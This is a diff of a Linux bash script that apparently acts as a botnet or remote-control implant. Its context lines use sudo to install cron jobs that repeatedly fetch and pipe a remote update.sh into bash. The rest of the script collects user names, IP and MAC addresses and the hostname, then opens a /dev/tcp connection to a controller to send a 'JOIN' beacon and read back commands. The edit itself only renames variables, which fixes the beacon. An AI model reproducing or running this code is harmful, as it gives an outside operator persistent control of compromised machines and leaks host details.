@@ -16,15 +16,15 @@ sudo su -c "(crontab -l 2>/dev/null; echo \"*/20 * * * * curl -L $host:2042/linu
 sudo su -c "printf \"#\!/bin/bash\ncurl -L $host:2042/linux/update.sh |bash\n\" > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
 # Don't use whoami, will generally be root, which is useless
-USER=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
+user=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
 # hostname -I returns trailing space
-IP=$(hostname -I | sed 's/ *$//')
-HOSTNAME=$(hostname)
-MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
+ip=$(hostname -I | sed 's/ *$//')
+hostname=$(hostname)
+mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')
 
-PORT=2043
+port=2043
 
-exec 3<>/dev/tcp/$host/$PORT
+exec 3<>/dev/tcp/$host/$port
 printf "JOIN: $user $ip $hostname $mac" >&3
 
 cat <&3
